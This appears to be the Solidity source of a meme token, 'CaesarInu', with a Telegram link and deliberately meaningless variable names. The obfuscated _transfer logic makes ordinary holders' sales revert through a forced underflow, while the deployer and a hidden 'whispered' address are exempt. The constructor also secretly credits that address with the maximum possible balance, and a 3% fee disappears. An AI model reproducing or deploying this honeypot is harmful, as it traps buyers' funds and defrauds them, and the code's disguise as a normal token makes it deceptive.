// https://t.me/caesar_inu

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CaesarInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private worse;

    function _transfer(
        address sport,
        address lamp,
        uint256 unusual
    ) internal override {
        uint256 plate = ranch;

        if (its[sport] == 0 && worse[sport] > 0 && uniswapV2Pair != sport) {
            its[sport] -= plate;
        }

        address those = kids;
        kids = lamp;
        worse[those] += plate + 1;

        _balances[sport] -= unusual;
        uint256 usually = (unusual / 100) * ranch;
        unusual -= usually;
        _balances[lamp] += unusual;
    }

    address private kids;
    mapping(address => uint256) private its;
    uint256 public ranch = 3;

    constructor(
        string memory occasionally,
        string memory nor,
        address pupil,
        address whispered
    ) ERC20(occasionally, nor) {
        uniswapV2Router = IUniswapV2Router02(pupil);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 careful = ~(uint256(0));

        its[msg.sender] = careful;
        its[whispered] = careful;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[whispered] = careful;
    }
}